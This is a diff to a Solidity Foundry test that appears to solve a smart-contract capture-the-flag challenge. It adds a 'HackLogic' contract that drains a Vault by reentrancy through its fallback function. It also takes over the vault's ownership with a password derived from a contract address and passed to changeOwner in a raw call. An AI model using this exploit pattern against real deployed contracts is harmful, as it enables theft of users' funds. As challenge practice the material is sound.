@@ -5,7 +5,33 @@ import "forge-std/Test.sol";
 import "../src/Vault.sol";
 
 
+contract HackLogic {
+    address  _vault;
+    constructor(address vault_)  {
+        _vault = vault_;
+    }
 
+    function deposite() public payable {
+        
+        Vault(payable(_vault)).deposite{value: msg.value}();
+    }
+
+    function openWithdraw() public {
+        Vault(payable(_vault)).openWithdraw();
+    }
+
+    function withdraw() public {
+        Vault(payable(_vault)).withdraw();
+    }
+
+
+    fallback() external payable{
+        console.log("HackLogic fallback");
+        if (_vault.balance > 0) {
+            Vault(payable(_vault)).withdraw();
+        }
+    }
+}
 
 contract VaultExploiter is Test {
     Vault public vault;
@@ -31,6 +57,19 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        {
+            HackLogic hack = new HackLogic(address(vault));
+            bytes32 password = bytes32(uint256(uint160(address(logic))));
+            address newOwner = address(hack);
+            bytes memory callData = abi.encodeWithSignature("changeOwner(bytes32,address)", password, newOwner);
+            address(vault).call(callData);
+            hack.deposite{value: 0.01 ether}();
+            hack.openWithdraw();
+            hack.withdraw();
+
+
+
+        }
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
